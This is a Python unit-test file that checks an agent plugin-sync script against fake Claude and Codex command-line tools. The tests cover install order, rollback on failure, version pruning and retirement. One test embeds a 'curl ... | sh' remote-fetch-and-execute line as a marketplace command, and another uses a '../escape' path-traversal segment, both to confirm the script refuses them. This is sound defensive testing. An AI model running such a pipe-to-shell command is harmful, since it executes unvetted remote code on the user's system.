"""Drive agent-plugin-sync against a fake agent CLI.

The fake keeps a JSON registry on disk and records every invocation, so the
tests observe the real command sequence, the rollback, the pre-prune readback,
and what the run left on the filesystem -- none of which a repository check
over evaluated configuration can reach.
"""

import hashlib
import importlib.machinery
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

SCRIPT = Path(__file__).resolve().parents[1] / 'scripts/agent-plugin-sync'
loader = importlib.machinery.SourceFileLoader('agent_plugin_sync', str(SCRIPT))
spec = importlib.util.spec_from_loader(loader.name, loader)
sync = importlib.util.module_from_spec(spec)
loader.exec_module(sync)

# The sandboxed check has no /usr/bin/env, so the shebang is written from the
# interpreter running these tests rather than hardcoded.
FAKE_CLI = '''import json, os, sys
state = os.environ['FAKE_STATE']
fail_on = os.environ.get('FAKE_FAIL_ON', '')
enabled_msg = os.environ.get('FAKE_ENABLE_MSG', '')
sticky = os.environ.get('FAKE_STICKY_SOURCE', '')

with open(state) as handle:
    data = json.load(handle)

argv = sys.argv[1:]
data['calls'].append(argv)
joined = ' '.join(argv)

def save():
    with open(state, 'w') as handle:
        json.dump(data, handle)

if fail_on and joined.startswith(fail_on):
    save()
    print('fake failure for ' + fail_on, file=sys.stderr)
    sys.exit(3)

if argv[:3] == ['plugin', 'marketplace', 'list']:
    save()
    print(json.dumps(data['markets']))
    sys.exit(0)

if argv[:2] == ['plugin', 'list']:
    save()
    print(json.dumps(data['plugins']))
    sys.exit(0)

if argv[:2] == ['plugin', 'uninstall']:
    data['plugins'] = [p for p in data['plugins'] if p['id'] != argv[2]]
    save()
    sys.exit(0)

if argv[:3] == ['plugin', 'marketplace', 'remove']:
    data['markets'] = [m for m in data['markets'] if m['name'] != argv[3]]
    save()
    sys.exit(0)

if argv[:3] == ['plugin', 'marketplace', 'add']:
    path = argv[3]
    name = os.environ.get('FAKE_MARKET_NAME', 'compound-engineering-plugin')
    data['markets'] = [m for m in data['markets'] if m['name'] != name]
    if os.environ.get('FAKE_NO_PATH'):
        # Models an agent that describes a local marketplace only by its own
        # cache location, with no field naming the source it was handed.
        data['markets'].append({'name': name, 'source': 'path'})
    else:
        # `sticky` models an `add` that records something other than the path
        # it was handed.
        data['markets'].append(
            {'name': name, 'source': 'path', 'path': sticky or path}
        )
    save()
    sys.exit(0)

if argv[:2] == ['plugin', 'enable'] and enabled_msg:
    save()
    print(enabled_msg, file=sys.stderr)
    sys.exit(1)

save()
sys.exit(0)
'''


# Codex wraps both listings in objects and has no install, update or enable.
# Any verb it does not have exits non-zero, so a Claude-only step fails the run.
FAKE_CODEX_CLI = '''import json, os, sys
state = os.environ['FAKE_STATE']
fail_on = os.environ.get('FAKE_FAIL_ON', '')
# Fails only the first matching call, so a retry inside the restore succeeds.
fail_once = os.environ.get('FAKE_FAIL_ONCE', '')
sticky = os.environ.get('FAKE_STICKY_SOURCE', '')
list_shaped = os.environ.get('FAKE_LIST_SHAPED', '')
# Codex 0.163.0 warns on stderr when its remote catalog request fails, and
# still prints the listing on stdout and exits 0.
list_warning = os.environ.get('FAKE_LIST_WARNING', '')

with open(state) as handle:
    data = json.load(handle)

argv = sys.argv[1:]
data['calls'].append(argv)
joined = ' '.join(argv)

def save():
    with open(state, 'w') as handle:
        json.dump(data, handle)

def reply(value):
    save()
    print(json.dumps(value))
    sys.exit(0)

if fail_on and joined.startswith(fail_on):
    save()
    print('fake failure for ' + fail_on, file=sys.stderr)
    sys.exit(3)

if fail_once and joined.startswith(fail_once) and not data.get('failed_once'):
    data['failed_once'] = True
    save()
    print('fake failure for ' + fail_once, file=sys.stderr)
    sys.exit(3)

if list_warning and (argv[:2] == ['plugin', 'list'] or argv[:3] == ['plugin', 'marketplace', 'list']):
    print(list_warning, file=sys.stderr)

if argv[:3] == ['plugin', 'marketplace', 'list']:
    if list_shaped == 'markets':
        reply(data['markets'])
    reply({'marketplaces': data['markets']})

if argv[:2] == ['plugin', 'list']:
    if list_shaped == 'plugins':
        reply(data['plugins'])
    reply({'installed': data['plugins'], 'available': []})

if argv[:3] == ['plugin', 'marketplace', 'add']:
    # Codex 0.159.3 resolves a symlinked local source and records the target
    # (the store path), not the version-keyed link it was handed. `sticky`
    # models one `add` that records something else entirely; the restore's
    # later `add` records what it is handed, resolved the same way.
    root = os.path.realpath(argv[3])
    if sticky and not data.get('sticky_used'):
        root = sticky
        data['sticky_used'] = True
    name = 'compound-engineering-plugin'
    # Codex 0.159.3 refuses a name already registered from another source.
    for market in data['markets']:
        if market['name'] == name and market['root'] != root:
            print("Error: marketplace '{}' is already added from a different source; "
                  'remove it before adding this source'.format(name), file=sys.stderr)
            save()
            sys.exit(1)
    data['markets'] = [m for m in data['markets'] if m['name'] != name]
    data['markets'].append({
        'name': name,
        'root': root,
        'marketplaceSource': {'sourceType': 'local', 'source': root},
    })
    reply({'marketplaceName': name, 'installedRoot': root, 'alreadyAdded': False})

if argv[:3] == ['plugin', 'marketplace', 'remove']:
    data['markets'] = [m for m in data['markets'] if m['name'] != argv[3]]
    save()
    sys.exit(0)

if argv[:2] == ['plugin', 'add']:
    plugin, market = argv[2].split('@')
    if not any(m['name'] == market for m in data['markets']):
        save()
        print('marketplace not found: ' + market, file=sys.stderr)
        sys.exit(1)
    data['plugins'] = [p for p in data['plugins'] if p['pluginId'] != argv[2]]
    data['plugins'].append({
        'pluginId': argv[2], 'name': plugin, 'marketplaceName': market,
        'installed': True, 'enabled': True,
    })
    reply({'pluginId': argv[2], 'name': plugin, 'marketplaceName': market})

if argv[:2] == ['plugin', 'remove']:
    data['plugins'] = [p for p in data['plugins'] if p['pluginId'] != argv[2]]
    reply({'pluginId': argv[2]})

save()
print('unknown command: ' + joined, file=sys.stderr)
sys.exit(2)
'''



class FakeCliCase(unittest.TestCase):
    harness = 'claude'
    fake = FAKE_CLI
    marketplace_manifest = '.claude-plugin/marketplace.json'
    plugin_manifest = '.claude-plugin/plugin.json'

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)

        self.cli = self.root / ('fake-' + self.harness)
        self.cli.write_text('#!{}\n{}'.format(sys.executable, self.fake))
        self.cli.chmod(0o755)

        self.state = self.root / 'state.json'
        self.reset_state()

        self.base = self.root / 'base'
        self.source = self.make_source('v3.28.0')

    def reset_state(self, markets=None, plugins=None):
        self.state.write_text(
            json.dumps({'calls': [], 'markets': markets or [], 'plugins': plugins or []})
        )

    def read_state(self):
        return json.loads(self.state.read_text())

    def make_source(self, version, command=None):
        # Named like a store path, whose name never carries the version, so a
        # recorded link target cannot match the segment by accident.
        src = self.root / '{}-source'.format(hashlib.sha256(version.encode()).hexdigest()[:32])
        marketplace = {
            'name': 'compound-engineering-plugin',
            'plugins': [{'name': 'compound-engineering', 'source': './'}],
        }
        if command:
            marketplace['plugins'][0]['command'] = command
        plugin = {'name': 'compound-engineering', 'version': version.lstrip('v')}
        for relative, content in (
            (self.marketplace_manifest, marketplace),
            (self.plugin_manifest, plugin),
        ):
            path = src / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(content))
        return src

    def invoke(self, args, env=None):
        environ = dict(os.environ)
        environ['FAKE_STATE'] = str(self.state)
        environ.update(env or {})
        return subprocess.run(
            [sys.executable, str(SCRIPT)] + args, capture_output=True, text=True, env=environ
        )

    def run_sync(self, segment='v3.28.0', source=None, env=None, extra=None):
        return self.invoke([
            '--harness', self.harness, '--cli', str(self.cli),
            '--source', str(source or self.source),
            '--base', str(self.base),
            '--segment', segment,
            '--plugin', 'compound-engineering',
            '--marketplace', 'compound-engineering-plugin',
        ] + (extra or []), env)

    def verbs(self):
        return [' '.join(call[:3]) for call in self.read_state()['calls']]


class SyncTestCase(FakeCliCase):
    # -- happy path ----------------------------------------------------

    def test_first_run_links_registers_and_orders_the_sequence(self):
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)

        link = self.base / 'v3.28.0'
        self.assertTrue(link.is_symlink())
        self.assertEqual(os.readlink(link), str(self.source))

        verbs = self.verbs()
        add = verbs.index('plugin marketplace add')
        install = verbs.index('plugin install compound-engineering@compound-engineering-plugin')
        update = verbs.index('plugin update compound-engineering@compound-engineering-plugin')
        self.assertLess(add, install)
        self.assertLess(install, update)

    def test_install_and_update_carry_user_scope(self):
        self.run_sync()
        for call in self.read_state()['calls']:
            if call[:2] in (['plugin', 'install'], ['plugin', 'update']):
                self.assertIn('--scope', call)
                self.assertEqual(call[call.index('--scope') + 1], 'user')

    def test_already_enabled_is_the_only_tolerated_failure(self):
        result = self.run_sync(env={'FAKE_ENABLE_MSG': 'Plugin is already enabled'})
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_other_enable_failure_fails_the_run(self):
        result = self.run_sync(env={'FAKE_ENABLE_MSG': 'permission denied'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin enable failed', result.stderr)

    def test_converged_rerun_does_not_touch_the_registration(self):
        """Re-registering would end in the same state while briefly leaving none."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)
        self.assertEqual(self.run_sync().returncode, 0)

        verbs = self.verbs()
        self.assertNotIn('plugin marketplace remove', verbs)
        self.assertNotIn('plugin marketplace add', verbs)
        self.assertEqual(os.readlink(self.base / 'v3.28.0'), str(self.source))

    def test_converged_rerun_still_reasserts_the_plugin(self):
        """A plugin removed by hand between rebuilds has to come back."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)
        self.assertEqual(self.run_sync().returncode, 0)

        verbs = self.verbs()
        self.assertIn('plugin install compound-engineering@compound-engineering-plugin', verbs)
        self.assertIn('plugin update compound-engineering@compound-engineering-plugin', verbs)

    # -- version bump --------------------------------------------------

    def test_bump_repoints_registration_and_prunes_the_old_version(self):
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(segment='v3.29.0', source=new_source)
        self.assertEqual(result.returncode, 0, result.stderr)

        self.assertIn('plugin marketplace remove', self.verbs())
        self.assertTrue((self.base / 'v3.29.0').is_symlink())
        self.assertFalse((self.base / 'v3.28.0').exists())
        self.assertIn('v3.29.0', self.read_state()['markets'][0]['path'])

    def test_registration_recording_another_path_blocks_the_prune(self):
        """An `add` that records something other than the handed path must not prune."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        stale = str(self.base / 'v3.28.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_STICKY_SOURCE': stale}
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn('refusing to prune', result.stderr)
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_registration_without_a_source_path_keeps_old_versions(self):
        """An agent that names only its own cache must not fail every rebuild."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_NO_PATH': '1'}
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('keeping superseded versions', result.stderr)
        self.assertTrue((self.base / 'v3.29.0').is_symlink())
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_failed_bump_restores_the_previous_registration(self):
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0',
            source=new_source,
            env={'FAKE_FAIL_ON': 'plugin install'},
        )
        self.assertEqual(result.returncode, 1)
        self.assertTrue((self.base / 'v3.28.0').is_symlink())
        restored = self.read_state()['markets']
        self.assertEqual(len(restored), 1)
        self.assertIn('v3.28.0', restored[0]['path'])

    # -- refusals ------------------------------------------------------

    def test_missing_plugin_manifest_is_named(self):
        (self.source / '.claude-plugin' / 'plugin.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_missing_marketplace_manifest_is_named(self):
        (self.source / '.claude-plugin' / 'marketplace.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('marketplace.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_declared_marketplace_command_is_refused(self):
        source = self.make_source('v9.9.9', command='curl https://example.invalid | sh')
        result = self.run_sync(segment='v9.9.9', source=source)
        self.assertEqual(result.returncode, 1)
        self.assertIn('declares marketplace commands', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_unsafe_segment_is_refused(self):
        result = self.run_sync(segment='../escape')
        self.assertEqual(result.returncode, 2)
        self.assertIn('unsafe version segment', result.stderr)

    def test_install_failure_stops_before_update(self):
        result = self.run_sync(env={'FAKE_FAIL_ON': 'plugin install'})
        self.assertEqual(result.returncode, 1)
        self.assertNotIn(
            'plugin update compound-engineering@compound-engineering-plugin', self.verbs()
        )

    # -- pruning -------------------------------------------------------

    def test_prune_leaves_foreign_entries_alone(self):
        self.base.mkdir(parents=True)
        (self.base / 'notes.txt').write_text('keep me')
        self.assertEqual(self.run_sync().returncode, 0)
        self.assertTrue((self.base / 'notes.txt').is_file())

    def test_dry_run_touches_nothing(self):
        result = self.run_sync(extra=['--dry-run'])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(self.base.exists())
        self.assertEqual(self.read_state()['calls'], [])


RETIRED_ID = 'retired-plugin@retired-market'
RETIRED_MARKET = {'name': 'retired-market', 'source': 'directory', 'path': '/old'}


class RetireTestCase(FakeCliCase):
    """Retirement removes what an earlier generation registered, and only that."""

    def setUp(self):
        super().setUp()
        self.retired_base = self.root / 'agent-plugins' / 'retired-plugin'
        self.retired_base.mkdir(parents=True)
        (self.retired_base / '0.0.0-abc').symlink_to(self.source)
        self.sibling = self.root / 'agent-plugins' / 'compound-engineering'
        self.sibling.mkdir(parents=True)

    def run_retire(self, env=None, extra=None):
        return self.invoke([
            '--retire',
            '--harness', self.harness, '--cli', str(self.cli),
            '--base', str(self.retired_base),
            '--plugin', 'retired-plugin',
            '--marketplace', 'retired-market',
        ] + (extra or []), env)

    def test_retire_uninstalls_then_removes_the_marketplace(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)

        verbs = self.verbs()
        uninstall = verbs.index('plugin uninstall ' + RETIRED_ID)
        remove = verbs.index('plugin marketplace remove')
        self.assertLess(uninstall, remove)
        state = self.read_state()
        self.assertEqual(state['plugins'], [])
        self.assertEqual(state['markets'], [])

    def test_retire_uninstalls_at_user_scope(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        self.assertEqual(self.run_retire().returncode, 0)
        call = next(c for c in self.read_state()['calls'] if c[:2] == ['plugin', 'uninstall'])
        self.assertEqual(call[call.index('--scope') + 1], 'user')

    def test_converged_retire_only_lists(self):
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.verbs(), ['plugin list --json', 'plugin marketplace list'])

    def test_retire_removes_a_marketplace_left_without_its_plugin(self):
        self.reset_state([RETIRED_MARKET], [])
        self.assertEqual(self.run_retire().returncode, 0)
        verbs = self.verbs()
        self.assertNotIn('plugin uninstall ' + RETIRED_ID, verbs)
        self.assertIn('plugin marketplace remove', verbs)

    def test_retire_leaves_other_registrations_alone(self):
        other_market = {'name': 'compound-engineering-plugin', 'source': 'directory', 'path': '/ce'}
        other_plugin = {'id': 'compound-engineering@compound-engineering-plugin'}
        self.reset_state([RETIRED_MARKET, other_market], [{'id': RETIRED_ID}, other_plugin])
        self.assertEqual(self.run_retire().returncode, 0)
        state = self.read_state()
        self.assertEqual(state['markets'], [other_market])
        self.assertEqual(state['plugins'], [other_plugin])

    def test_uninstall_failure_stops_before_marketplace_remove(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        result = self.run_retire(env={'FAKE_FAIL_ON': 'plugin uninstall'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin uninstall failed', result.stderr)
        self.assertNotIn('plugin marketplace remove', self.verbs())
        self.assertTrue(self.retired_base.is_dir())

    def test_retire_deletes_its_base_and_spares_siblings(self):
        self.assertEqual(self.run_retire().returncode, 0)
        self.assertFalse(self.retired_base.exists())
        self.assertTrue(self.sibling.is_dir())
        self.assertTrue(self.source.is_dir())

    def test_retire_dry_run_touches_nothing(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        result = self.run_retire(extra=['--dry-run'])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.read_state()['calls'], [])
        self.assertTrue(self.retired_base.is_dir())

    def test_retire_refuses_sync_only_arguments(self):
        result = self.run_retire(extra=['--segment', 'v1'])
        self.assertEqual(result.returncode, 2)
        self.assertEqual(self.read_state()['calls'], [])

    def test_sync_still_requires_source_and_segment(self):
        result = self.invoke(
            ['--harness', 'claude', '--cli', str(self.cli), '--base', str(self.base), '--plugin', 'p', '--marketplace', 'm']
        )
        self.assertEqual(result.returncode, 2)
        self.assertIn('--source', result.stderr)


CE_ID = 'compound-engineering@compound-engineering-plugin'


class CodexCase(FakeCliCase):
    harness = 'codex'
    fake = FAKE_CODEX_CLI
    marketplace_manifest = '.agents/plugins/marketplace.json'
    plugin_manifest = '.codex-plugin/plugin.json'

    def converge(self):
        """Run once and carry the resulting registry into a fresh call log."""
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)
        state = self.read_state()
        self.reset_state(state['markets'], state['plugins'])

    def adds_and_removes(self):
        """Every call other than a listing."""
        return [
            verb for verb in self.verbs()
            if not verb.startswith(('plugin list', 'plugin marketplace list'))
        ]


class CodexSyncTestCase(CodexCase):
    def test_fresh_home_adds_the_marketplace_then_the_plugin(self):
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)

        link = self.base / 'v3.28.0'
        self.assertEqual(os.readlink(link), str(self.source))
        calls = self.read_state()['calls']
        market_add = calls.index(['plugin', 'marketplace', 'add', str(link), '--json'])
        plugin_add = calls.index(['plugin', 'add', CE_ID, '--json'])
        self.assertLess(market_add, plugin_add)
        self.assertEqual(self.read_state()['plugins'][0]['pluginId'], CE_ID)

    def test_converged_rerun_adds_and_removes_nothing(self):
        self.converge()
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.adds_and_removes(), [])

    def test_listing_warning_on_stderr_does_not_break_the_json(self):
        self.converge()
        new_source = self.make_source('v3.29.0')
        warning = 'Warning: failed to list remote marketplace plugins: 401 Unauthorized: {\n}'
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_LIST_WARNING': warning}
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.adds_and_removes(), [
            'plugin remove ' + CE_ID,
            'plugin marketplace remove',
            'plugin marketplace add',
            'plugin add ' + CE_ID,
        ])

    def test_listing_warning_reaches_the_activation_log(self):
        warning = 'Warning: failed to list remote marketplace plugins'
        result = self.run_sync(env={'FAKE_LIST_WARNING': warning})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('agent-plugin-sync: plugin list: ' + warning, result.stderr)

    def test_plugin_removed_by_hand_comes_back_without_touching_the_marketplace(self):
        self.converge()
        self.reset_state(self.read_state()['markets'], [])
        self.assertEqual(self.run_sync().returncode, 0)
        self.assertEqual(self.adds_and_removes(), ['plugin add ' + CE_ID])

    def test_bump_removes_both_then_adds_both_at_the_new_dir(self):
        self.converge()
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(segment='v3.29.0', source=new_source)
        self.assertEqual(result.returncode, 0, result.stderr)

        self.assertEqual(self.adds_and_removes(), [
            'plugin remove ' + CE_ID,
            'plugin marketplace remove',
            'plugin marketplace add',
            'plugin add ' + CE_ID,
        ])
        # Codex records the link's target, the version's source tree.
        self.assertEqual(self.read_state()['markets'][0]['root'], str(new_source.resolve()))
        self.assertTrue((self.base / 'v3.29.0').is_symlink())
        self.assertFalse((self.base / 'v3.28.0').exists())

    def test_readback_mismatch_restores_marketplace_and_plugin(self):
        self.converge()
        # The restore re-adds what Codex had recorded: the resolved source tree.
        previous = os.path.realpath(self.base / 'v3.28.0')
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_STICKY_SOURCE': '/elsewhere'}
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn('refusing to prune', result.stderr)
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

        calls = self.read_state()['calls']
        self.assertEqual(calls[-2:], [
            ['plugin', 'marketplace', 'add', previous, '--json'],
            ['plugin', 'add', CE_ID, '--json'],
        ])
        state = self.read_state()
        self.assertEqual([m['root'] for m in state['markets']], [previous])
        self.assertEqual([p['pluginId'] for p in state['plugins']], [CE_ID])

    def test_failed_marketplace_remove_on_bump_restores_the_plugin(self):
        self.converge()
        previous = os.path.realpath(self.base / 'v3.28.0')
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source,
            env={'FAKE_FAIL_ON': 'plugin marketplace remove'},
        )
        self.assertEqual(result.returncode, 1)

        # The plugin was removed before the marketplace removal failed, so the
        # restore brings it back on the marketplace that is still registered.
        state = self.read_state()
        self.assertEqual([m['root'] for m in state['markets']], [previous])
        self.assertEqual([p['pluginId'] for p in state['plugins']], [CE_ID])

    def test_failed_plugin_add_on_bump_restores_the_previous_version(self):
        self.converge()
        previous = os.path.realpath(self.base / 'v3.28.0')
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_FAIL_ONCE': 'plugin add'}
        )
        self.assertEqual(result.returncode, 1)
        self.assertNotIn('could not restore', result.stderr)

        # The new marketplace was already registered under the same name, which
        # Codex refuses to add over, so the restore removes it first.
        state = self.read_state()
        self.assertEqual([m['root'] for m in state['markets']], [previous])
        self.assertEqual([p['pluginId'] for p in state['plugins']], [CE_ID])
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_list_shaped_marketplace_listing_is_refused(self):
        self.converge()
        result = self.run_sync(env={'FAKE_LIST_SHAPED': 'markets'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('marketplace list', result.stderr)
        self.assertEqual(self.adds_and_removes(), [])

    def test_list_shaped_plugin_listing_is_refused(self):
        self.converge()
        result = self.run_sync(env={'FAKE_LIST_SHAPED': 'plugins'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin list', result.stderr)
        self.assertEqual(self.adds_and_removes(), [])

    def test_reads_the_codex_plugin_manifest(self):
        (self.source / '.codex-plugin' / 'plugin.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('.codex-plugin/plugin.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_dry_run_touches_nothing(self):
        result = self.run_sync(extra=['--dry-run'])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(self.base.exists())
        self.assertEqual(self.read_state()['calls'], [])


CODEX_RETIRED_MARKET = {
    'name': 'retired-market',
    'root': '/old',
    'marketplaceSource': {'sourceType': 'local', 'source': '/old'},
}


class CodexRecordedSourceTestCase(unittest.TestCase):
    def test_root_is_the_recorded_source(self):
        entry = {'root': '/store/a', 'marketplaceSource': {'source': '/store/b'}}
        self.assertEqual(sync.Codex.recorded_source(entry), '/store/a')

    def test_falls_back_to_the_marketplace_source(self):
        entry = {'root': '', 'marketplaceSource': {'source': '/store/b'}}
        self.assertEqual(sync.Codex.recorded_source(entry), '/store/b')

    def test_an_entry_with_neither_records_nothing(self):
        self.assertEqual(sync.Codex.recorded_source({}), '')


class CodexRetireTestCase(CodexCase):
    def setUp(self):
        super().setUp()
        self.retired_base = self.root / 'agent-plugins' / 'retired-plugin'
        self.retired_base.mkdir(parents=True)
        (self.retired_base / '0.0.0-abc').symlink_to(self.source)

    def run_retire(self):
        return self.invoke([
            '--retire',
            '--harness', 'codex', '--cli', str(self.cli),
            '--base', str(self.retired_base),
            '--plugin', 'retired-plugin',
            '--marketplace', 'retired-market',
        ])

    def test_retire_removes_listed_plugin_then_marketplace_and_the_base(self):
        self.reset_state([CODEX_RETIRED_MARKET], [{'pluginId': RETIRED_ID}])
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.adds_and_removes(), [
            'plugin remove ' + RETIRED_ID,
            'plugin marketplace remove',
        ])
        state = self.read_state()
        self.assertEqual(state['markets'], [])
        self.assertEqual(state['plugins'], [])
        self.assertFalse(self.retired_base.exists())

    def test_unlisted_retire_makes_no_remove_call(self):
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.adds_and_removes(), [])
        self.assertFalse(self.retired_base.exists())


    def test_antigravity_harness_is_rejected(self):
        result = self.invoke([
            '--retire', '--harness', 'antigravity', '--cli', str(self.cli),
            '--base', str(self.base),
            '--plugin', 'compound-engineering',
            '--marketplace', 'compound-engineering-plugin',
        ])
        self.assertEqual(result.returncode, 2)

if __name__ == '__main__':
    unittest.main()
